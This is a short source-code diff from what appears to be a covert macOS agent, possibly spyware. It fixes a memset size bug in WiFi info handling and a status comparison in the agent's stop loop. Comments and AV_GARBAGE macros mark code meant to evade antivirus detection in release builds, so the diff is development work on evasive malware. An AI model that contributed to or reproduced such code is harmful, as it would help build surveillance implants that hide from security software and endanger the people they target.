@@ -718,8 +718,9 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
       // AV evasion: only on release build
       AV_GARBAGE_004
       
-      memset(tmpInfo, 0, sizeof(tmpInfo));
-      
+      //memset(tmpInfo, 0, sizeof(tmpInfo));  // J: this is wrong
+      memset(tmpInfo, 0, sizeof(WiFiInfo));
+        
       // AV evasion: only on release build
       AV_GARBAGE_000
       
@@ -988,7 +989,7 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   // AV evasion: only on release build
   AV_GARBAGE_002
   
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
+    while (![[mAgentConfiguration objectForKey: @"status"] isEqual: AGENT_STOPPED]
          && internalCounter <= MAX_STOP_WAIT_TIME)
   {
     internalCounter++;
